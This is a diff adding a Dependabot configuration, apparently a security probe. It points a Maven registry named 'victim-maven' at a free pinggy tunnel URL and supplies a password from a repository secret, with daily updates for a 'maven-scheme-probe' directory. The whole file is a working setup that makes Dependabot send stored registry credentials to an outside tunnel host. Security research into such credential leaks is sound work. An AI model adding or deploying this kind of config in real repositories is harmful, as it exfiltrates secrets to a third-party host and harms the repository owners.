@@ -1,0 +1,15 @@
+version: 2
+registries:
+  victim-maven:
+    type: maven-repository
+    url: https://vjevx-89-37-63-107.run.pinggy-free.link/victim
+    username: no_01-bundler-victim
+    password: ${{secrets.NO_01_BUNDLER_PASSWORD}}
+updates:
+  - package-ecosystem: maven
+    directory: "/maven-scheme-probe"
+    registries:
+      - victim-maven
+    schedule:
+      interval: daily
+    open-pull-requests-limit: 1
